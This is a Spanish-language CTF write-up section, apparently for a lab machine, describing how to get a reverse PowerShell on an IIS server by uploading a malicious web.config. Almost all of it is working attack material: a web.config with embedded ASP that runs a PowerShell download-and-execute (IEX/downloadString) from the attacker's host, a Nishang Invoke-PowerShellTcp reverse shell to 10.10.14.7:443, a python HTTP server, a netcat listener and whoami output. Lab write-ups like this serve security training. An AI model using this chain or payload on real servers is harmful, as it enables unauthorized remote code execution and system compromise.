## Vuln exploit & Gaining Access {-}

### Ganando accesso con un web.config {-}

Aqui trabajaremos con Nishang porque nos queremos entablar una PowerShell.

1. Descargamos Nishang y modificamos el fichero de reverse shell por tcp

    ```bash
    git clone https://github.com/samratashok/nishang
    cd nishang/Shells
    cp Invoke-PowerShellTcp.ps1 ../../PS.ps1
    cd ../..
    nano PS.ps1
    ```

    Modificamos el fichero PS.ps1 para añadir `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 443` al final del fichero

1. Modificamos el web.config para que descarge el fichero PS.ps1 al momento que lo lanzemos.

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <configuration>
    <system.webServer>
        <handlers accessPolicy="Read, Script, Write">
            <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
        </handlers>
        <security>
            <requestFiltering>
                <fileExtensions>
                <remove fileExtension=".config" />
                </fileExtensions>
                <hiddenSegments>
                <remove segment="web.config" />
                </hiddenSegments>
            </requestFiltering>
        </security>
    </system.webServer>
    </configuration>
    <!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
    <%
    Set co = CreateObject("WScript.Shell")
    Set cte = co.Exec("cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/PS.ps1')")
    output = cte.StdOut.Readall()
    Response.write(output)
    %>
    -->
    ```

1. Uploadeamos el fichero en la web

1. Lanzamos un servidor web con pyhton

    ```bash
    python -m http.server 80
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Navigamos al url `http://10.10.10.93/uploadedFiles/web.config`

Y vemos que ganamos accesso al systema

```bash
whoami

#Output
bounty\merlin
```
